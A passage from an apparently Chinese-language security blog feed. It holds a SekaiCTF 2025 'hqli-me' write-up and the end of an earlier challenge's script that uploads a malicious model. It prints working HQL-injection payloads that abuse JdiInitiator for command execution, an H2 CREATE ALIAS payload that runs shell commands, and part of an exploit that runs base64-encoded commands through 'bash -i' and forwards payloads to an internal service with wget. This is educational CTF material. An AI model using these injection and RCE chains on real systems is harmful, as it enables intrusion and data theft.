class="line">tf.saved_model.save(model, <span class="string">&quot;malicious_model&quot;</span>, signatures=&#123;<span class="string">&#x27;serve&#x27;</span>: model.serve&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 打包为 ZIP ====</span></span><br><span class="line">shutil.make_archive(<span class="string">&quot;model&quot;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&quot;malicious_model&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated model.zip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 上传到靶机 ====</span></span><br><span class="line">url = <span class="string">&quot;https://eci-2ze3h3ldcbzfy3zyrndw.cloudeci1.ichunqiu.com:5000/upload&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;model.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    files = &#123;<span class="string">&#x27;model_file&#x27;</span>: (<span class="string">&quot;model.zip&quot;</span>, f, <span class="string">&#x27;application/zip&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Upload response:&quot;</span>, r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文曲签学&quot;&gt;&lt;a href=&quot;#文曲签学&quot; class=&quot;headerlink&quot; title=&quot;文曲签学&quot;&gt;&lt;/a&gt;文曲签学&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://images-1321971079.cos.ap-beijing.myqcloud.co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sekaictf 2025 hqli-me</title>
    <link href="http://example.com/2025/09/15/sekaictf-2025-hqli-me/"/>
    <id>http://example.com/2025/09/15/sekaictf-2025-hqli-me/</id>
    <published>2025-09-15T09:00:10.000Z</published>
    <updated>2025-09-15T09:03:34.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hqli-me"><a href="#hqli-me" class="headerlink" title="hqli-me"></a>hqli-me</h2><p>参考:<br><a href="https://www.valgrindc.tf/posts/hqli-me/">https://www.valgrindc.tf/posts/hqli-me/</a></p><p>题目总体有两部分</p><ol><li><code>authn_service</code> 使用h2数据库</li><li><code>order_service</code> 使用mysql数据库<br>而远程只暴露出<code>order_service</code>, 但flag存在于<code>authn_service</code></li></ol><h3 id="order-service"><a href="#order-service" class="headerlink" title="order_service"></a>order_service</h3><p>先看order_service, 在order_service中明显存在sql注入<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250904155924.png" alt="image.png"><br>去看<code>Util.validateFields(fields)</code>的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validateFields</span><span class="params">(String fields)</span> &#123;  </span><br><span class="line">    <span class="type">var</span> <span class="variable">tokens</span> <span class="operator">=</span> fields.split(<span class="string">&quot;,&quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tokens.length; i++) &#123;  </span><br><span class="line">        <span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span> tokens[i].trim();  </span><br><span class="line">        <span class="comment">// Check if it contains non-alphanumeric character  </span></span><br><span class="line">        <span class="keyword">if</span> (Pattern.matches(<span class="string">&quot;\\W&quot;</span>, token)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3></blockquote><ul><li><p><code>String.split(&quot;,&quot;)</code>：把输入的字符串分成若干字段，比如 <code>&quot;id,name,age&quot;</code> → <code>[&quot;id&quot;, &quot;name&quot;, &quot;age&quot;]</code>。</p></li><li><p><code>Pattern.matches(&quot;\\W&quot;, token)</code>：检查 <strong>整个 token 是否完全由单个“非单词字符”构成</strong>。</p><ul><li><p>在 Java 正则里：</p><ul><li><p><code>\w</code> &#x3D; <code>[A-Za-z0-9_]</code>（字母、数字、下划线）</p></li><li><p><code>\W</code> &#x3D; <code>[^A-Za-z0-9_]</code>（非字母数字下划线）</p></li></ul></li><li><p>但是 ⚠️ <code>Pattern.matches</code> 要求 <strong>整个字符串都匹配</strong>，所以 <code>&quot;abc$&quot;</code> 不会返回 true，只有 <code>&quot;!&quot;</code> 这样的才会返回 true。</p></li></ul></li></ul><p>因此这里相当于是没有防护, </p><p>再看<code>order_service</code>如何操作<code>authn_service</code>, 一共有两处</p><ol><li>login, 对<code>/login</code>路由传入 可控username和md5(password)</li><li>getSession, 对<code>/sessionInfo</code>路由传入可控sessionId, 但sessionId进行了验证, 满足<code>if (!sessionId.matches(&quot;^[0-9a-fA-F]+$&quot;))</code>时抛错</li></ol><h3 id="authn-service"><a href="#authn-service" class="headerlink" title="authn_service"></a>authn_service</h3><p>再看authn_service<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250904173140.png" alt="image.png"></p><p>也是明显的两处注入</p><h3 id="HQL-RCE"><a href="#HQL-RCE" class="headerlink" title="HQL RCE"></a>HQL RCE</h3><p>这几处都是使用hibernate进行的orm, 因此可以造成<code>HQL</code>注入, 可以看见它的sql语句与普通的mysql确实有些差异, 他是对java对象的操作<br>参考:<br>[[HQL注入]]</p><p>HQL 的一个有趣的点是它允许我们在查询中使用 <code>new</code> 关键字调用 Java 类的构造函数。对于大多数类，构造函数对类字段进行简单的赋值，因此它们根本没有用处。一个主要的例外是 <a href="https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jshell/share/classes/jdk/jshell/execution/JdiInitiator.java">JdiInitiator</a>)。<br>文档<br><a href="https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E%5C(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map%5C)">https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E%5C(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map%5C)</a></p><p>关于这个类的背景, 其与JShell有关:<br>JShell 本身并不会在<strong>当前 JVM</strong>直接执行你写的代码，它会：</p><ol><li><p><strong>启动一个新的“执行 JVM”</strong>（Execution VM），专门用来运行你输入的代码。</p><ul><li>这个 JVM 是用 JDI 启动的（相当于 IDE 调试器 attach 一个 JVM）。</li></ul></li><li><p><strong>把你的代码片段（snippet）编译成 class</strong>，通过 JDI 发送到那个 JVM 里。</p></li><li><p><strong>在执行 JVM 里运行它</strong>，然后通过 JDI 把结果返回给 JShell。<br>这个过程中，<code>JdiInitiator</code> 就是 <strong>负责第 1 步“启动并连接执行 JVM”</strong> 的类。</p></li></ol><p>再比如:<br>当你在命令行运行 <code>jshell</code>，然后输入 <code>System.out.println(&quot;hi&quot;)</code> 时：</p><ul><li><p><code>JdiInitiator</code> 会启动一个子 JVM；</p></li><li><p>通过 JDI 把你的代码片段（class 文件&#x2F;字节码）送进去；</p></li><li><p>然后拿回运行结果。</p></li></ul><p>在启动JVM时, 会指定自定义的jvm启动参数, 对应构造器参数 <a href="https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map)"><code>customConnectorArgs</code></a><br>按照文档, 该参数是<code>custom arguments passed to the connector</code>, 这回传给connector</p><p>根据构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;this-escape&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JdiInitiator</span><span class="params">(<span class="type">int</span> port, List&lt;String&gt; remoteVMOptions, String remoteAgent,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> isLaunch, String host, <span class="type">int</span> timeout,</span></span><br><span class="line"><span class="params">            Map&lt;String, String&gt; customConnectorArgs)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remoteAgent = remoteAgent;</span><br><span class="line">        <span class="built_in">this</span>.connectTimeout = (<span class="type">int</span>) (timeout * CONNECT_TIMEOUT_FACTOR);</span><br><span class="line">        <span class="type">String</span> <span class="variable">connectorName</span></span><br><span class="line">                <span class="operator">=</span> isLaunch</span><br><span class="line">                        ? <span class="string">&quot;com.sun.jdi.CommandLineLaunch&quot;</span></span><br><span class="line">                        : <span class="string">&quot;com.sun.jdi.SocketListen&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.connector = findConnector(connectorName);</span><br><span class="line">        <span class="keyword">if</span> (connector == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No connector named: &quot;</span> + connectorName);</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;String, String&gt; argumentName2Value</span><br><span class="line">                = isLaunch</span><br><span class="line">                        ? launchArgs(port, String.join(<span class="string">&quot; &quot;</span>, remoteVMOptions))</span><br><span class="line">                        : <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!isLaunch) &#123;</span><br><span class="line">            argumentName2Value.put(<span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;&quot;</span>+timeout);</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span> &amp;&amp; !isLaunch) &#123;</span><br><span class="line">                argumentName2Value.put(<span class="string">&quot;localAddress&quot;</span>, host);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        customConnectorArgs.entrySet()</span><br><span class="line">                           .stream()</span><br><span class="line">                           .filter(e -&gt; !<span class="string">&quot;vmexec&quot;</span>.equals(e.getKey()))</span><br><span class="line">                           .forEach(e -&gt; argumentName2Value.put(e.getKey(), e.getValue()));</span><br><span class="line">        <span class="built_in">this</span>.connectorArgs = mergeConnectorArgs(connector, argumentName2Value);</span><br><span class="line">        <span class="built_in">this</span>.vm = isLaunch</span><br><span class="line">                ? launchTarget()</span><br><span class="line">                : listenTarget(port, remoteVMOptions);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里connector对应两种(启动模式和监听模式), 我们关注的是<code>com.sun.jdi.CommandLineLaunch</code>这个命令行启动, 它的默认实现是<a href="https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/SunCommandLineLauncher.java"><code>SunCommandLineLauncher</code></a><br>阅读<code>JdiInitiator</code>的构造器源码, 最终是可以调用到<code>SunCommandLineLauncher</code>的<code>launch</code>方法, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250905214909.png" alt="image.png"></p><p>查看这个command的拼接来源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">home</span> <span class="operator">=</span> argument(ARG_HOME, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> argument(ARG_OPTIONS, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">mainClassAndArgs</span> <span class="operator">=</span> argument(ARG_MAIN, arguments).value();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">wait</span> <span class="operator">=</span> ((BooleanArgumentImpl)argument(ARG_INIT_SUSPEND,</span><br><span class="line">                                                  arguments)).booleanValue();</span><br><span class="line">        <span class="type">String</span> <span class="variable">quote</span> <span class="operator">=</span> argument(ARG_QUOTE, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exe</span> <span class="operator">=</span> argument(ARG_VM_EXEC, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">includeVThreads</span> <span class="operator">=</span> argument(ARG_VM_INCLUDE_VTHREADS, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exePath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>发现<code>exePath</code>是arguments参数传过来, 可控的!<br>这样我们就可以在其启动命令中进行命令注入了</p><p>写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.jshell.execution.JdiInitiator;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(<span class="string">&quot;home&quot;</span>, <span class="string">&quot;calc\&quot; \&quot;&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JdiInitiator</span> <span class="variable">jdiInitiator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdiInitiator</span>(<span class="number">30000</span>,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(),  </span><br><span class="line">                <span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,  </span><br><span class="line">                <span class="string">&quot;127.0.0.1&quot;</span>,  </span><br><span class="line">                <span class="number">10000000</span>,  </span><br><span class="line">                map);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250905223355.png" alt="image.png"></p><p>hql使用</p><ol><li>new map(“value1” as key1, “value2” as key2)创建map</li><li>new list(“value1”, “value2”) 创建list</li></ol><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionId=3916dbbe17d08b5802cdcb35824e316&amp;fields=new jdk.jshell.execution.JdiInitiator(5, new list(&quot;&quot;), new java.lang.String(&quot;asdf&quot;), true, null, 8000, new map(&quot;^&quot; as quote,&quot;^bash^-c^^id&gt;/tmp/win^^&quot; as home)) UNION select new jdk.jshell.execution.JdiInitiator(0, new list(&quot;&quot;), new java.lang.String(&quot;jdk.jshell.execution.RemoteExecutionControl&quot;), true, null, 8000, new map(&quot;a&quot; as a, &quot;b&quot; as b))</span><br></pre></td></tr></table></figure><p>这可以使得命令注入的结果输出到tmp目录<br>至于为什么需要后面的<code>UNION select</code>, 作者题解中解释说是为了确保hibernate能够收到返回值,具有相同的列数,  当我去掉UNION查询时, 并没有看见任何报错信息, 但注入的命令也没有被执行<br>gpt给出的解释如下:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250907135313.png" alt="image.png"></p><p>猜测大概是延迟实例化的原因</p><p>现在已经拿下了<code>order_service</code>, 但flag存在于<code>authn_service</code>, 思路是通过ssrf来打<code>authn_service</code>的 h2</p><p>在本地把<code>authn_service</code>的8000端口映射出来用作测试</p><p>根据<a href="https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/hqli-me/solution/e.py">官方WP</a> , payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=aaaa&amp;password=&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;a&#x27;&#x27;, &#x27;&#x27;/flag&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=&quot;</span><br></pre></td></tr></table></figure><p>在h2中使用<code>function()</code>去调用CSVWRITE, 但目的不在于CSVWRITE, 而是可以执行后面的sql语句, 利用h2可以执行java代码的特性, 执行以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void leak(String sessId, String cmd) throws java.lang.Exception &#123;  </span><br><span class="line">    sekai.HibernateUtil.addSession(  </span><br><span class="line">            new sekai.Session(  </span><br><span class="line">                    sekai.HibernateUtil.addUser(  </span><br><span class="line">                            new sekai.User(  </span><br><span class="line">                                    new java.lang.String(  </span><br><span class="line">                                            new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后<code>CALL SHELLEXEC(&#39;&#39;a&#39;&#39;, &#39;&#39;/flag&#39;&#39;)</code>, 创建了一个sessionId为<code>a</code>, username为 <code>&lt;/flag内容&gt; &#39;|| &quot;</code><br>这里的<code>&#39;|| &quot;</code>是用来闭合hql语句的</p><p>之后当去 order_serive查询<code>sessionId=a&amp;fields=1||&#39;</code><br>首先代码中会根据sessionId查出authnUser, 也就是<code>SEKAI&#123;test_flag&#125;\n&#39;||&quot;</code><br>之后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select %s from Order o where o.username=\&quot;%s\&quot;&quot;</span>.formatted(fields, authnUser);</span><br></pre></td></tr></table></figure><p>就会构造出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span><span class="string">&#x27; from Order o where o.username=&quot; SEKAI&#123;test_flag&#125;\n&#x27;</span><span class="operator">||</span>&quot;&quot;</span><br></pre></td></tr></table></figure><p>这样就把flag回显带出来了</p><p>有了攻击<code>authn_service</code>的payload, 我们只需要在<code>order_service</code>命令注入, 使用wget 或者curl将payload提交到<code>authn_service</code>, 之后就能访问<code>order_service</code>获得flag</p><p>关于前面的命令注入, 题目给出了另一种方法, 这里我以执行id命令给出payload<br>首先还是在<code>orders</code>路由<br>payload1:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sessionId=a0b77d2f648dd30ee9a77cd385fcd164&amp;fields=new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \&quot;\n</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"></span><br><span class="line">\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads)) union select new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \&quot;\n</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"></span><br><span class="line">\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))</span><br></pre></td></tr></table></figure><p>首先还是使用JdiInitiator, 在其参数map中设置main为一个jlink命令, 这里本意并不是要使用jlink, 关键在于<code>--save-opts /tmp/lol</code>, 把这次的jlink参数保存在了<code>/tmp/lol</code>, 我们可以看见<code>/tmp/lol</code>是这样的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250910123908.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Tue Sep 09 14:18:16 UTC 2025</span><br><span class="line">--output /tmp/ab --add-modules java.base -p </span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"> --save-opts /tmp/lol </span><br></pre></td></tr></table></figure><p>之后payload2</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionId=a0b77d2f648dd30ee9a77cd385fcd164&amp;fields=new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads)) union select new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))</span><br></pre></td></tr></table></figure><p>这里使用JShellToolProvider而不是把&#x2F;tmp&#x2F;lol的内容推到jshell中当作java代码执行, 这个过程&#x2F;tmp&#x2F;lol文件中的java代码就被成功执行了</p><p>官方exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span>  </span><br><span class="line">  </span><br><span class="line">leak_sess_id = <span class="string">&quot;a&quot;</span>  </span><br><span class="line">cmd = <span class="string">&quot;/flag&quot;</span>  </span><br><span class="line">  </span><br><span class="line">sess = requests.Session()  </span><br><span class="line">  </span><br><span class="line">sessionId = sess.post(  </span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">p = <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">\\&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;%s&#x27;&#x27;, &#x27;&#x27;%s&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=\\&quot;  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(  </span><br><span class="line">    <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line">) % (  </span><br><span class="line">    leak_sess_id,  </span><br><span class="line">    cmd,  </span><br><span class="line">)  </span><br><span class="line"><span class="built_in">print</span>(p)  </span><br><span class="line">cmd = <span class="string">f&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">wget --header=&#x27;Content-Type: application/x-www-form-urlencoded&#x27; --post-data &quot;username=u&amp;password=<span class="subst">&#123;p&#125;</span>&quot; http://127.0.0.1:8000/login  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip()  </span><br><span class="line"><span class="built_in">print</span>(cmd)  </span><br><span class="line">cmd = (  </span><br><span class="line">    <span class="string">&quot;/bin/bash -c &#123;echo,&quot;</span>  </span><br><span class="line">    + base64.b64encode(cmd.encode()).decode()  </span><br><span class="line">    + <span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">constr_bytes = <span class="string">&quot;/**/,&quot;</span>.join(  </span><br><span class="line">    <span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> cmd[i : i + <span class="number">60</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cmd), <span class="number">60</span>)  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">java_code = (  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Runtime.getRuntime().exec(new String(new byte[]&#123;%s&#125;));  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">    % constr_bytes  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&#x27;new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \\&quot;\\n<span class="subst">&#123;java_code&#125;</span>\\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; 